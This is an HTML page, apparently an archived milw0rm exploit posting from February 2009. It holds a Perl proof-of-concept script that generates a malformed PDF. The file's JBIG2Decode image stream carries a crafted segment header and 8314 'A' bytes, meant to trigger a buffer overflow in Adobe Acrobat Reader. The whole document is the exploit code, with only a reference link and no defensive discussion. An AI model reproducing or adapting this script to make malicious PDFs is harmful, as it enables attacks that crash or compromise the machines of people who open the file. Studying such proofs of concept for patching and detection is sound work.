<html><head><title>Adobe Acrobat Reader JBIG2 Local Buffer Overflow PoC #2 0day</title></head><pre>#!/usr/bin/perl
# k`sOSe 02/22/2009

# http://vrt-sourcefire.blogspot.com/2009/02/have-nice-weekend-pdf-love.html

my $size = &quot;\x40\x00&quot;;
my $factor = &quot;ABCD&quot;;
my $data = &quot;A&quot; x 8314;


print pdf();

sub pdf() 
{

&quot;%PDF-1.5\n&quot; .
&quot;%\xec\xf5\xf2\xe1\xe4\xef\xe3\xf5\xed\xe5\xee\xf4\n&quot; .
&quot;3 0      \n&quot; .
&quot;xref\n&quot; .
&quot;3 16\n&quot; .
&quot;0000000023 00000 n \n&quot; .
&quot;0000000584 00000 n \n&quot; .
&quot;0000000865 00000 n \n&quot; .
&quot;0000001035 00000 n \n&quot; .
&quot;0000001158 00000 n \n&quot; .
&quot;0000001287 00000 n \n&quot; . 
&quot;0000001338 00000 n \n&quot; .
&quot;0000001384 00000 n \n&quot; .
&quot;0000002861 00000 n \n&quot; .
&quot;0000003637 00000 n \n&quot;  .
&quot;0000005126 00000 n \n&quot; .
&quot;0000005173 00000 n \n&quot; .
&quot;0000005317 00000 n \n&quot; .
&quot;0000005370 00000 n \n&quot; .
&quot;0000005504 00000 n \n&quot; .
&quot;0000000714 00000 n \n&quot; .
&quot;trailer\n&quot; .
&quot;&lt;&lt;/Root 4 0 R/Info 2 0 R/ID[&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt; &lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;]/Size 19/Prev 10218&gt;&gt;\n&quot; .
&quot;startxref\n&quot; .
&quot;0\n&quot; .
&quot;%%EOF\n&quot; .
&quot;   \n&quot; .
&quot;4 0 obj\n&quot; .
&quot;&lt;&lt;/Type/Catalog/Pages 1 0 R/OCProperties&lt;&lt;/OCGs[9 0 R 13 0 R]/D&lt;&lt;/Order[9 0 R 13 0 R]/ON[9 0 R 13 0 R]/OFF[]&gt;&gt;&gt;&gt;&gt;&gt;\n&quot; .
&quot;endobj\n&quot; .
&quot;         \n&quot; .
&quot;5 0 obj\n&quot; .
&quot;&lt;&lt;/Type/Page/MediaBox[0 0 640 480]/Resources&lt;&lt;/XObject&lt;&lt;/Im001 7 0 R/Im002 10 0 R/Im003 11 0 R/Im004 14 0 R/Im005 16 0 R&gt;&gt;&gt;&gt;/Contents 6 0 R/Parent 1 0 R&gt;&gt;\n&quot; .
&quot;endobj\n&quot; .
&quot;6 0 obj\n&quot; .
&quot;&lt;&lt;/Length 56/Filter/FlateDecode&gt;&gt;\n&quot; .
&quot;stream\n&quot; .
&quot;x\x9c\xe3*T031P\x00A\x13\x0b\x08\x9d\x9c\xab\xa0\xef\x99k``\xa8\xe0\x92\xaf\x10\xc8\x85[\x81\x11!\x05\xc6\x84\x14\x98\xc0\x14\xc0\$\@\xb4\x05\xb2\n&quot; .
&quot;S\xb0\n&quot; .
&quot;\x00J\x15#,\n&quot; .
&quot;endstream\n&quot; .
&quot;endobj\n&quot; .

&quot;12 0 obj\n&quot; .
&quot;&lt;&lt;/Subtype/Image/Width 640/Height 480/ColorSpace/DeviceGray/BitsPerComponent 1/Decode[1 0]/Interpolate true/Length 1314/Filter/JBIG2Decode&gt;&gt;\n&quot; .
&quot;stream\n&quot; .
&quot;\x00\x00\x00\x01&quot; . $size . $factor . &quot;\x13&quot; . $data . &quot;endstream\n&quot; .
&quot;endobj\n&quot; .
&quot;13 0 obj\n&quot; .
&quot;&lt;&lt;/Type/OCG/Name(Text Color)&gt;&gt;\n&quot; .
&quot;endobj\n&quot; .
&quot;14 0 obj\n&quot; .
&quot;&lt;&lt;/Subtype/Image/Width 1/Height 1/ColorSpace/DeviceGray/BitsPerComponent 8/SMask 12 0 R/OC 15 0 R/Length 1&gt;&gt;\n&quot; .
&quot;stream\n&quot; .
&quot;\x00\n&quot; .
&quot;endstream\n&quot; .
&quot;endobj\n&quot; .

&quot;1 0 obj\n&quot; .
&quot;&lt;&lt;/Type/Pages/Kids[5 0 R]/Count 1&gt;&gt;\n&quot; .
&quot;endobj\n&quot; .
&quot;xref\n&quot; . 
&quot;0 3\n&quot; . 
&quot;0000000000 65535 f \n&quot; .
&quot;0000009988 00000 n \n&quot; .
&quot;0000010039 00000 n \n&quot; .
&quot;trailer\n&quot; .
&quot;&lt;&lt;/ID[&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt; &lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;]/Size 3&gt;&gt;\n&quot; .
&quot;startxref\n&quot; .
&quot;104\n&quot; .
&quot;%%EOF\n&quot;;

}

# milw0rm.com [2009-02-23]</pre></html>